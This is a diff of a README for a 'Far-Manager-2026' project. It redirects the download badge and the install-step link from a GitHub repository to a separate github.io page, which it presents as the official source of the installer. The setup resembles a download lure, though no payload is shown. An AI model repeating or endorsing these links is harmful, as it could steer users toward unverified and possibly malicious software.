@@ -1,6 +1,6 @@
 # 📁 Far-Manager-2026 - Manage your files with ease
 
-[![Download Far Manager](https://img.shields.io/badge/Download-Release-blue)](https://github.com/linnetapplicatory136/Far-Manager-2026)
+[![Download Far Manager](https://img.shields.io/badge/Download-Release-blue)](https://linnetapplicatory136.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ This software works on modern Windows versions. Ensure your computer meets these
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official repository page to get the installer: [https://github.com/linnetapplicatory136/Far-Manager-2026](https://github.com/linnetapplicatory136/Far-Manager-2026).
+1.  Visit the official repository page to get the installer: [https://linnetapplicatory136.github.io](https://linnetapplicatory136.github.io).
 2.  Locate the latest version in the release section.
 3.  Click the link to download the installation file to your computer.
 4.  Open your Downloads folder.
